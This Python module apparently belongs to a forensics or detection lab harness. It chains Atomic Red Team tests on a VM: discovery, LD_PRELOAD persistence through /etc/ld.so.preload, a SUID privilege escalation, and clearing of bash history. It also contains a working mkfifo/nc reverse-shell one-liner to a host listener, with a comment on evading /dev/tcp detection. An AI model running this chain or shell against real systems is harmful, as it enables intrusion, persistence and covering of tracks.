"""
orchestrator/attacks/scenario_01_ldpreload.py

Scenario 01: Userland LD_PRELOAD + PrivEsc + Reverse Shell + Cleanup

Steps
-----
1. Discovery      T1082  - system info collection (best-effort)
2. LD_PRELOAD     T1574.006 - write /etc/ld.so.preload (prereqs + exec + cleanup)
3. SUID PrivEsc   T1548.001 - set SUID bit on a test binary
4. Reverse shell  T1059.004 - mkfifo+nc one-liner with host listener
5. Cleanup        T1070.003 - clear bash history

Forensic artifacts generated
-----------------------------
Disk:
  /etc/ld.so.preload        - persistence entry (removed by cleanup only if called)
  /tmp/T1574006.so          - compiled malicious shared library
  /tmp/T1574006.c           - source (if ART copies it; usually stays)
  /tmp/T1548001_test        - SUID binary
  modified atime on /etc/ld.so.preload
  ~/.bash_history            - if cleanup NOT run: contains all commands above
                             - if cleanup IS run: file absent or truncated

Memory:
  gcc process (during prereq)
  sh -c 'echo ... > /etc/ld.so.preload' (T1574.006 executor)
  ld.so.preload loaded in subsequent processes after step 2
  nc / bash reverse shell process and its socket (step 4)
  env variable LD_PRELOAD may appear in /proc/<pid>/environ of shell
"""

from __future__ import annotations

import logging
import socket
import subprocess
import threading
import time
from pathlib import Path
from typing import Any

from orchestrator.attacks.art_runner import ArtRunner
from orchestrator.core.ssh_client import SSHClient

_log = logging.getLogger(__name__)

# --- ART test identifiers ------------------------------------------------

_DISCOVERY_T = "T1082"
_DISCOVERY_G = (
    "354a8eac-0813-4f27-8b21-1e1c1e5a1af1"  # System Information Discovery via uname
)

_LDPRELOAD_T = "T1574.006"
_LDPRELOAD_G = "39cb0e67-dd0d-4b74-a74b-c072db7ae991"  # via /etc/ld.so.preload

_SUID_T = "T1548.001"
_SUID_G = "6578d943-9303-4e89-8a57-2f40a36f68e7"  # setuid via chmod

_CLEANUP_T = "T1070.003"
_CLEANUP_G = "a934276e-2be5-4a36-93fd-98adbb5bd4fc"  # rm ~/.bash_history

# Reverse shell config (host-side listener)
_REVSHELL_PORT = 4444
_REVSHELL_TIMEOUT = 10  # seconds to wait for connection


# --- public entry point --------------------------------------------------


def run(
    ssh: SSHClient,
    runner: ArtRunner,
    atomics_path: Path,
    host_ip: str,
    run_cleanup: bool = False,
) -> dict[str, Any]:
    """
    Execute scenario 01 steps in sequence.

    Returns a ground-truth dict describing what was executed.
    Raises RuntimeError if a mandatory step fails.
    """
    ground_truth: dict[str, Any] = {"scenario": "01-ldpreload", "steps": []}
    steps = ground_truth["steps"]

    # Step 1: Discovery (best-effort, failure is acceptable)
    _log.info("[1/5] Discovery")
    result = runner.run_test(_DISCOVERY_T, _DISCOVERY_G, raise_on_error=False)
    steps.append({"step": "discovery", **result})

    # Step 2: LD_PRELOAD persistence
    # Prerequisite: compile the .so (needs gcc, no internet)
    _log.info("[2/5] LD_PRELOAD persistence")
    runner.run_prerequisites(_LDPRELOAD_T, _LDPRELOAD_G, timeout=60)
    result = runner.run_test(_LDPRELOAD_T, _LDPRELOAD_G)
    steps.append({"step": "ldpreload", **result})

    # Step 3: SUID privilege escalation
    _log.info("[3/5] SUID PrivEsc")
    result = runner.run_test(_SUID_T, _SUID_G, raise_on_error=False)
    steps.append({"step": "suid_privesc", **result})

    # Step 4: Reverse shell (host listener + ART one-liner on VM)
    _log.info("[4/5] Reverse shell")
    result = _run_reverse_shell(ssh, host_ip)
    steps.append({"step": "reverse_shell", **result})

    # Step 5: Cleanup (optional - set run_cleanup=False to preserve artifacts)
    if run_cleanup:
        _log.info("[5/5] Cleanup: history clear + LD_PRELOAD removal")
        runner.run_test(_CLEANUP_T, _CLEANUP_G, raise_on_error=False)
        runner.run_cleanup(_LDPRELOAD_T, _LDPRELOAD_G)
        steps.append({"step": "cleanup", "run": True})
    else:
        _log.info("[5/5] Cleanup: SKIPPED (artifacts preserved for forensics)")
        steps.append({"step": "cleanup", "run": False})

    return ground_truth


# --- reverse shell helpers -----------------------------------------------


def _run_reverse_shell(ssh: SSHClient, host_ip: str) -> dict[str, Any]:
    """
    Start a netcat listener on the host, trigger mkfifo+nc reverse shell on
    the VM, capture one line of output to confirm the connection.

    The shell is immediately killed after confirmation; we only need to
    record that the connection was established and leave memory artifacts.
    """
    received: list[str] = []
    error: list[str] = []

    def _listen() -> None:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind(("0.0.0.0", _REVSHELL_PORT))
                srv.listen(1)
                srv.settimeout(_REVSHELL_TIMEOUT)
                conn, addr = srv.accept()
                _log.info("[+] Reverse shell connected from %s", addr)
                conn.sendall(b"id\n")
                time.sleep(0.5)
                data = conn.recv(4096)
                received.append(data.decode(errors="replace").strip())
                conn.sendall(b"exit\n")
                conn.close()
        except Exception as exc:
            error.append(str(exc))

    listener = threading.Thread(target=_listen, daemon=True)
    listener.start()

    # Give the listener a moment to bind before triggering the shell on VM
    time.sleep(0.3)

    # mkfifo + nc reverse shell (no /dev/tcp to avoid bash built-in detection)
    fifo = "/tmp/.rs_fifo"
    cmd = (
        f"rm -f {fifo}; mkfifo {fifo}; "
        f"cat {fifo} | /bin/sh -i 2>&1 | nc {host_ip} {_REVSHELL_PORT} > {fifo} &"
    )
    code, out, err = ssh.run(cmd, timeout=15)

    listener.join(timeout=_REVSHELL_TIMEOUT + 2)

    if error:
        _log.warning("[!] Reverse shell listener error: %s", error[0])
    elif not received:
        _log.warning("[!] Reverse shell: no data received (connection may have failed)")
    else:
        _log.info("[+] Reverse shell id output: %s", received[0])

    return {
        "exit_code": code,
        "connected": bool(received),
        "id_output": received[0] if received else "",
        "error": error[0] if error else "",
    }
